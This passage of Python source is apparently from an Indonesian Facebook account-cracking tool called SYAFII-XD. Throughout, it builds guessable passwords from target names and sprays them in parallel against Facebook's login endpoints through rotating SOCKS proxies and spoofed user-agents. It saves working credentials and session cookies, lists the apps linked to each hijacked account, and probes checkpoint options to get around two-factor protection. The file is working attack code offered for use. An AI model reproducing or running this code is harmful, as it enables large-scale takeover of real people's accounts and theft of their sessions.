	guw = '# tampilkan opsi hasil cekpoint ? (y/t)'
	sol().print(mark(guw, style=f'{JG}'))
	osk = input(x+'['+p+'f'+x+'] Pilih : ')
	if osk in ['y','Y']:
		oprek.append('ya')
	else:
		oprek.append('no')

	guw = '# tampilkan hasil akun cekpoint ? (y/t)'
	sol().print(mark(guw, style=f'{JG}'))
	cpres = input(x+'['+p+'f'+x+'] Pilih : ')
	if cpres in ['y','Y']:
		princp.append('ya')
	else:
		princp.append('no')
	guw = '# ingin menambahkan pasword manual ? (y/t)'
	sol().print(mark(guw, style=f'{JG}'))
	pwplus=input(x+'['+p+'f'+x+'] Pilih : ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		krek = '[•] GUNAKAN KOMA UNTUK PEMISAH\n[•] GUNAKAN HURUF KECIL\n[•] CONTOH: indonesia,merdeka,mantap'
		cetak(nel(krek, title=' • ADDITIONAL PASSWORD • '))
		pwku=input('MASUKKAN PASSWORD TAMBAHAN: ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()

# WORDLIST
def passwrd():
	ler = '# UNTUK BERHENTI CRACK, TEKAN CTRL+Z TO STOP'
	sol().print(mark(ler, style='green'))
	krek = '[•] akun hasil crack ok akan tersimpan di ok/%s\n[•] akun hasil crack cp akan tersimpan di cp/%s\n[•] jika tidak ada hasil main mode pesawat setiap 1k id'%(okc,cpc)
	cetak(nel(krek, title=' 🥱 CRACK SEDANG BERJALAN 🥱 '))
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'touch' in method:
				pool.submit(cracktouch,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	tanya = '# CRACK SELESAI JANGAN LUPA BERSYUKUR APAPUN HASILNYA YA😘'
	sol().print(mark(tanya, style='green'))
	woi = input(x+'apakah masih ingin melanjutkan Crack(y/t):  ')
	if woi in ['y','Y']:
		login()
	else:
		exit()

# CRACKER
def crack(idf,pwv):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	nip=random.choice(prox)
	proxs= {'http': 'socks4://'+nip}
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	url_log=open('tool/url_login.txt','r').read()
	ses = requests.Session()
	sys.stdout.write('\r%s [SYAFII] %s/%s 🎎 OK:%s 🎎 CP:%s 🎎 %s%s%s 🎎'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
			ses.headers.update({'Host': url_log,'cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cros','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get(f'https://{url_log}/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":f"https://{url_log}/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2; wd=360x664'
			heade={'Host': url_log,'cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': f'https://{url_log}','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'com.facebook.orca','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cros','sec-fetch-dest': 'empty','referer': f'https://{url_log}/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post(f'https://{url_log}/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				elif 'ya' in princp:
					print(f'\r{K}🚀 {idf}|{pw}\n')
					os.popen('play-audio data/cp.mp3')
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print(f'\r{H}🚀 {idf}|{pw}|{kuki}\n')
					cetak(nel(f'{B2}User-Agent : {ua2}\n'))
					os.popen('play-audio data/ok.mp3')
					ok+=1
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					infoakun += (f"\n[bold cyan][•] LIST ACTIVE APPLICATIONS :[/bold cyan] \n")
					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
					nok=1
					for muncul in apkaktif:
						infoakun+= (f"[bold cyan][{nok}] {muncul[0]} {muncul[1]}[/bold cyan]\n")
						nok+=1

					hit=0
					infoakun += (f"\n[bold yellow][•] LIST EXPIRED APPLICATIONS :[/bold yellow]\n")
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for muncul in apkexp:
						hit+=1
						infoakun += (f"[bold yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n")
					print('\n')
					statusok = f'[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]SYAFII-XD OK[/bold green]'))
					os.popen('play-audio data/ok.mp3')
					ok+=1
					break


			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1


def crackfree(idf,pwv):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	nip=random.choice(prox)
	proxs= {'http': 'socks5://'+nip}
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	url_log=open('tool/url_login.txt','r').read()
	ses = requests.Session()
	sys.stdout.write('\r%s [SYAFII] %s/%s 🎎 OK:%s 🎎 CP:%s 🎎 %s%s%s 🎎'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
			ses.headers.update({'Host': url_log,'cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua2,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cros','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get(f'https://{url_log}/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":f"https://{url_log}/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2; wd=360x664'
			heade={'Host': url_log,'cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': f'https://{url_log}','content-type': 'application/x-www-form-urlencoded','user-agent': ua2,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'com.facebook.katana','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cros','sec-fetch-dest': 'empty','referer': f'https://{url_log}/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post(f'https://{url_log}/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				elif 'ya' in princp:
					print(f'\r{K}🚀 {idf}|{pw}\n')
					os.popen('play-audio data/cp.mp3')
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print(f'\r{H}🚀 {idf}|{pw}|{kuki}\n')
					cetak(nel(f'{B2}User-Agent : {ua2}\n'))
					os.popen('play-audio data/ok.mp3')
					ok+=1
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					infoakun += (f"\n[bold cyan][•] LIST ACTIVE APPLICATIONS :[/bold cyan] \n")
					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
					nok=1
					for muncul in apkaktif:
						infoakun+= (f"[bold cyan][{nok}] {muncul[0]} {muncul[1]}[/bold cyan]\n")
						nok+=1

					hit=0
					infoakun += (f"\n[bold yellow][•] LIST EXPIRED APPLICATIONS :[/bold yellow]\n")
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for muncul in apkexp:
						hit+=1
						infoakun += (f"[bold yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n")
					print('\n')
					statusok = f'[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]SYAFII-XD OK[/bold green]'))
					os.popen('play-audio data/ok.mp3')
					ok+=1
					break


			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1


def cracktouch(idf,pwv):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	nip=random.choice(prox)
	proxs= {'http': 'socks5://'+nip}
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	url_log=open('tool/url_login.txt','r').read()
	ses = requests.Session()
	sys.stdout.write('\r%s [SYAFII] %s/%s 🎎 OK:%s 🎎 CP:%s 🎎 %s%s%s 🎎'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
			ses.headers.update({'Host': url_log,'cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua2,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cros','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get(f'https://{url_log}/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":f"https://{url_log}/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2; wd=360x664'
			heade={'Host': url_log,'cache-control': 'max-age=0','sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': f'https://{url_log}','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cros','sec-fetch-dest': 'empty','referer': f'https://{url_log}/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post(f'https://{url_log}/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				elif 'ya' in princp:
					print(f'\r{K}🚀 {idf}|{pw}\n')
					os.popen('play-audio data/cp.mp3')
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print(f'\r{H}🚀 {idf}|{pw}|{kuki}\n')
					cetak(nel(f'{B2}User-Agent : {ua2}\n'))
					os.popen('play-audio data/ok.mp3')
					ok+=1
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					infoakun += (f"\n[bold cyan][•] LIST ACTIVE APPLICATIONS :[/bold cyan] \n")
					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
					nok=1
					for muncul in apkaktif:
						infoakun+= (f"[bold cyan][{nok}] {muncul[0]} {muncul[1]}[/bold cyan]\n")
						nok+=1

					hit=0
					infoakun += (f"\n[bold yellow][•] LIST EXPIRED APPLICATIONS :[/bold yellow]\n")
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for muncul in apkexp:
						hit+=1
						infoakun += (f"[bold yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n")
					print('\n')
					statusok = f'[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]SYAFII-XD OK[/bold green]'))
					os.popen('play-audio data/ok.mp3')
					ok+=1
					break


			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
def crackmbasic(idf,pwv):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	nip=random.choice(prox)
	proxs= {'http': 'socks5://'+nip}
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	url_log=open('tool/url_login.txt','r').read()
	ses = requests.Session()
	sys.stdout.write('\r%s [SYAFII] %s/%s 🎎 OK:%s 🎎 CP:%s 🎎 %s%s%s 🎎'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
			ses.headers.update({'Host': url_log,'cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua2,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cros','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get(f'https://{url_log}/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://developers.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2; wd=360x664'
			heade={'Host': url_log,'cache-control': 'max-age=0','sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': f'https://{url_log}','content-type': 'application/x-www-form-urlencoded','user-agent': ua2,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cros','sec-fetch-dest': 'empty','referer': f'https://{url_log}/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post(f'https://{url_log}/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				elif 'ya' in princp:
					print(f'\r{K}🚀 {idf}|{pw}\n')
					os.popen('play-audio data/cp.mp3')
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print(f'\r{H}🚀 {idf}|{pw}|{kuki}\n')
					cetak(nel(f'{B2}User-Agent : {ua2}\n'))
					os.popen('play-audio data/ok.mp3')
					ok+=1
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					infoakun += (f"\n[bold cyan][•] LIST ACTIVE APPLICATIONS :[/bold cyan] \n")
					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
					nok=1
					for muncul in apkaktif:
						infoakun+= (f"[bold cyan][{nok}] {muncul[0]} {muncul[1]}[/bold cyan]\n")
						nok+=1

					hit=0
					infoakun += (f"\n[bold yellow][•] LIST EXPIRED APPLICATIONS :[/bold yellow]\n")
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for muncul in apkexp:
						hit+=1
						infoakun += (f"[bold yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n")
					print('\n')
					statusok = f'[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]SYAFII-XD OK[/bold green]'))
					os.popen('play-audio data/ok.mp3')
					ok+=1
					break


			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

# OPSI
def ceker(idf,pw):
	global cp
	ua = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.128 Safari/537.36 FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.services;FBDV/EVR-L29;FBSV/10;FBLR/0;FBBK/1;FBCA/arm64-v8a:;]'
	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
		opsi = kent.find_all('option')
		if len(opsi)==0:
			print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
		else:
			for opsii in opsi:
				print('\r%s---> %s%s'%(kk,opsii.text,x))
	except Exception as c:
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s'%(u,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1

# OPSI CEKER
def cek_opsi():
	c = len(akun)
	hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)
	cetak(nel(hu, title='CEK OPSI'))
	input(x+'['+h+'•'+x+'] Mulai')
	cek = '# PROSES CEK OPSI DIMULAI'
	sol().print(mark(cek, style='green'))
	love = 0
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s++++ %s ----> Error      %s'%(b,kes,x))
				print('\r%s---> Pemisah Tidak Didukung Untuk Program Ini%s'%(u,x))
				continue
			bi = random.choice([u,k,kk,b,h,hh])
			print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
			ua = 'Mozilla/5.0 (Linux; Android 11; TECNO KD8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4755.101 Mobile Safari/537.36'
			ses = requests.Session()
			header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			hi = ses.get('https://mbasic.facebook.com')
			ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
					else:
						for opsii in opsi:
							print('\r%s---> %s%s'%(kk,opsii.text,x))
				except:
					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
					print('\r%s---> Tidak Dapat Mengecek Opsi%s'%(u,x))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s++++ %s|%s ----> OK       %s'%(h,id,pw,x))
			else:
				print('\r%s++++ %s|%s ----> SALAH       %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
			sol().print(mark(li, style='red'))
			exit()
	dah = '# DONE'
	sol().print(mark(dah, style='green'))
	exit()

if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('DUMP')
	except:pass
	try:os.system('clear')
	except:pass
	login()